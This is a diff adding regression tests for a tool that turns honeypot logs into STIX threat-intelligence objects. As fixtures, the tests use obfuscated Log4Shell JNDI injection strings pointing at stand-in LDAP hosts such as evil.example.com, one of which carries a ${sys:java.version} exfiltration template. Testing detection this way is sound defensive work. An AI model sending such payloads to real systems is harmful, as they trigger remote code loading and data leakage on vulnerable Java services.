@@ -556,3 +556,167 @@ def test_salvage_survives_the_url_already_being_in_the_bundle(cfg, state_db):
     assert rels and all(
         url_id in (r["source_ref"], r["target_ref"]) for r in rels
     )
+
+
+# ---------------------------------------------------------------------------
+# 7. Second independent-review regressions (2026-08-04)
+# ---------------------------------------------------------------------------
+
+def test_sighting_count_is_requests_not_url_variants(cfg, state_db):
+    """One request carrying N header variants of one zone is ONE
+    observation. Appending per payload inflated the count N-fold (12x on
+    the live payload shape) — and the earlier tests could not catch it:
+    one used 1 doc without asserting count, the other 5 docs x 1 payload.
+    """
+    doc = _legacy_doc(
+        src_ip=_header_probe("XF", 1),
+        **{"header_referer": _header_probe("RE", 2),
+           "header_cookie": _header_probe("CO", 3)},
+    )
+
+    _, objects = _run(cfg, state_db, [doc])
+
+    sightings = [o for o in objects if o["type"] == "sighting"]
+    assert len(sightings) == 1
+    assert sightings[0]["count"] == 1, "1 request must count as 1, not 3"
+    note = next(o for o in objects if o["type"] == "note")
+    assert "1 request(s)" in note["content"]
+
+
+def test_two_c2_zones_in_one_request_each_get_their_own_graph(cfg, state_db):
+    """Both groups share the same `first` event, so a session_id derived
+    only from the event collided and _dedup silently dropped the second
+    zone's Sighting and Note."""
+    doc = _legacy_doc(
+        src_ip=_obfuscate("jndi:ldap://a.zone-one.example/x", 1),
+        **{"header_referer": _obfuscate("jndi:ldap://b.zone-two.example/y", 2)},
+    )
+
+    _, objects = _run(cfg, state_db, [doc])
+
+    domains = {o["value"] for o in objects if o["type"] == "domain-name"}
+    assert domains == {"a.zone-one.example", "b.zone-two.example"}
+    assert len({o["id"] for o in objects if o["type"] == "sighting"}) == 2
+    assert len({o["id"] for o in objects if o["type"] == "note"}) == 2
+
+
+def test_literal_host_variants_each_keep_a_sighting(cfg, state_db):
+    """When the callback host carries no template, host-grouping
+    degenerates to one group per URL — every one still needs its own
+    Sighting and Note rather than 11 of 12 being suppressed."""
+    docs = [_legacy_doc(
+        src_ip=_obfuscate(f"jndi:ldap://xf{i}.dnslog.example/x", i),
+    ) for i in range(4)]
+
+    _, objects = _run(cfg, state_db, docs)
+
+    assert len({o["id"] for o in objects if o["type"] == "sighting"}) == 4
+    assert len({o["id"] for o in objects if o["type"] == "note"}) == 4
+
+
+def test_cve_and_technique_edges_survive_prior_emission(cfg, state_db):
+    """The scanner sprays the whole hive, so an attributed session often
+    emits CVE-2021-44228 and T1190 earlier in the same cycle. _dedup then
+    returns None for them and the salvage edges were dropped entirely."""
+    builder = STIXBuilder(cfg)
+    parser = H0neytr4pParser()
+    ev = parser.parse(_legacy_doc(src_ip=_PAYLOAD))
+
+    # Pre-emit both SDOs so the salvage path's builders return None.
+    assert builder.build_vulnerability("CVE-2021-44228") is not None
+    assert builder.build_attack_pattern("Log4Shell JNDI injection", "T1190") is not None
+
+    objects = builder.build_unattributed_payload_objects([ev])
+
+    from tpot2cti.stix_ids import (
+        generate_attack_pattern_id, generate_url_id, generate_vulnerability_id,
+    )
+    targets = {
+        r["target_ref"] for r in objects if r["type"] == "relationship"
+        if r["source_ref"] == generate_url_id(_C2_URL)
+    }
+    assert generate_vulnerability_id("CVE-2021-44228") in targets
+    assert generate_attack_pattern_id("Log4Shell JNDI injection") in targets
+
+
+def test_modern_schema_headers_are_scanned_for_payloads():
+    """~99.6% of live docs use the modern schema, which has no `header_*`
+    fields — a Referer-borne payload there was silently invisible."""
+    for field in ("http_referer", "http_host", "sni", "http_x_forwarded_for"):
+        ev = H0neytr4pParser().parse(_modern_doc(**{field: _PAYLOAD}))
+        assert ev.meta.get("jndi_payloads"), f"payload in {field} was missed"
+        assert ev.meta["jndi_payloads"][0]["url"] == _C2_URL
+        assert ev.meta["matched_cve"] == "CVE-2021-44228"
+
+
+def test_trailing_template_brace_is_not_stripped():
+    """`.../${sys:java.version}}` must not lose the template's own brace —
+    that reports a URL never sent, under a different deterministic id."""
+    found = extract_jndi(
+        "${" + _per_char("jndi:ldap://evil.example.com/", 1)
+        + "${sys:java.version}" + "}"
+    )
+    assert found[0].url == "ldap://evil.example.com/${sys:java.version}"
+
+
+def test_jndi_truncated_is_not_flagged_at_exactly_the_cap():
+    from tpot2cti.parsers.h0neytr4p import _MAX_JNDI_PER_EVENT
+    doc = _legacy_doc(src_ip="45.9.10.12", **{
+        f"header_x{i}": _obfuscate(f"jndi:ldap://h{i}.evil.example/x", i)
+        for i in range(_MAX_JNDI_PER_EVENT)
+    })
+    ev = H0neytr4pParser().parse(doc)
+    assert len(ev.meta["jndi_payloads"]) == _MAX_JNDI_PER_EVENT
+    assert "jndi_truncated" not in ev.meta
+
+    doc2 = _legacy_doc(src_ip="45.9.10.12", **{
+        f"header_x{i}": _obfuscate(f"jndi:ldap://h{i}.evil.example/x", i)
+        for i in range(_MAX_JNDI_PER_EVENT + 3)
+    })
+    ev2 = H0neytr4pParser().parse(doc2)
+    assert ev2.meta["jndi_truncated"] is True
+
+
+def test_xff_proxy_chain_keeps_the_client_address(cfg, state_db):
+    """src_ip IS the XFF header, so it arrives in XFF syntax. Rejecting
+    `client, proxy1` over a comma would discard a usable address."""
+    parser = H0neytr4pParser()
+    for raw, expected in (
+        ("45.9.10.11, 10.0.0.1, 10.0.0.2", "45.9.10.11"),
+        ('"45.9.10.11"', "45.9.10.11"),
+        ("45.9.10.11:5678", "45.9.10.11"),
+        ("[2001:db8::1]:443", "2001:db8::1"),
+        ("2001:db8::1", "2001:db8::1"),
+    ):
+        ev = parser.parse(_legacy_doc(src_ip=raw))
+        assert ev.src_ip == expected, f"{raw!r} -> {ev.src_ip!r}"
+
+    summary, objects = _run(cfg, state_db, [
+        _legacy_doc(src_ip="45.9.10.11, 10.0.0.1"),
+    ])
+    assert summary["drop_reasons"]["src_ip_rejected"] == 0
+    assert "45.9.10.11" in {o["value"] for o in objects if o["type"] == "ipv4-addr"}
+
+
+def test_no_dangling_refs_in_a_mixed_cycle(cfg, state_db):
+    """Every relationship/sighting/note reference must resolve to an
+    object present in the same bundle."""
+    docs = [
+        _modern_doc(),
+        _legacy_doc(src_ip=_PAYLOAD),
+        _legacy_doc(
+            src_ip=_obfuscate("jndi:ldap://a.zone-one.example/x", 7),
+            **{"header_referer": _obfuscate("jndi:ldap://b.zone-two.example/y", 9)},
+        ),
+    ]
+
+    _, objects = _run(cfg, state_db, docs)
+
+    ids = {o["id"] for o in objects}
+    for o in objects:
+        for key in ("source_ref", "target_ref", "sighting_of_ref"):
+            if ref := o.get(key):
+                assert ref in ids, f"{o['type']}.{key} dangles: {ref}"
+        for key in ("where_sighted_refs", "object_refs"):
+            for ref in o.get(key) or []:
+                assert ref in ids, f"{o['type']}.{key} dangles: {ref}"
